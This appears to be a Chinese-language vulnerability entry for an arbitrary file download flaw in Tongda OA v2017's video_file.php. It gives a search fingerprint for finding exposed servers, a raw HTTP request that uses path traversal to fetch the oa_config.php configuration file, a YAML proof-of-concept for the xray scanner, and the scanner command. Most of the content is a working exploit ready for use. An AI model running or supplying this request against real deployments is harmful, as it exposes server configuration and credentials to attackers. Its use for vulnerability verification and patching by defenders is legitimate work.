# 通达OA v2017 video_file.php 任意文件下载漏洞
## 漏洞描述

通达OA v2017 video_file.php文件存在任意文件下载漏洞，攻击者通过漏洞可以读取服务器敏感文件

## 影响版本
```
通达OA v2017
```

## 网络测绘
```
app="TDXK-通达OA"
```

## 环境搭建

-
## 漏洞复现
![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309201950041.png)

## 数据包
```
GET /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```

## YAML代码
```
name: poc-yaml-tongda-v2017-video-file-download
manual: true
transport: http
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
    expression: response.status == 200 && response.body.bcontains(b'$ROOT_PATH') && response.body.bcontains(b'$ATTACH_PATH')
expression: r0()
detail:
  author: klear
  links:
    - https://vuls.info/PeiQi/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20video_file.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E

```

## xray调用

```
xraypro  ws --poc poc-yaml-tongda-v2017-video-file-download.yml  --url xx
```

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309201949604.png)
